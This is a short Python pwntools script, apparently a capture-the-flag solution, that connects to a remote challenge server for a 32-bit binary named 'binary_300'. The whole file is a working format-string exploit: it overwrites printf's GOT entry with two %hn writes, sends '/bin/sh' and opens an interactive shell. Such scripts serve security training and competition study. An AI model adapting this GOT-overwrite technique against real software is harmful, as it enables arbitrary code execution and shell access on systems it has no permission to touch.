from pwn import *

context(arch = "i386", os = "linux", bits = 32)

DEBUG = False

if DEBUG:
    p = process("binary_300")
else:
    p = remote("bamboofox.cs.nctu.edu.tw", 22003)

elf = ELF("binary_300")

printf_got = 0x804a00c

payload1  = p32(elf.got["printf"]+2)
payload1 += p32(elf.got["printf"])
payload1 += "%{}c".format(0x0804-0x8)
payload1 += "%7$hn"
payload1 += "%{}c".format(0x8410-0x0804)
payload1 += "%8$hn"
p.sendline(payload1)

payload2  = "/bin/sh\x00"
p.sendline(payload2)

p.interactive()
p.close()
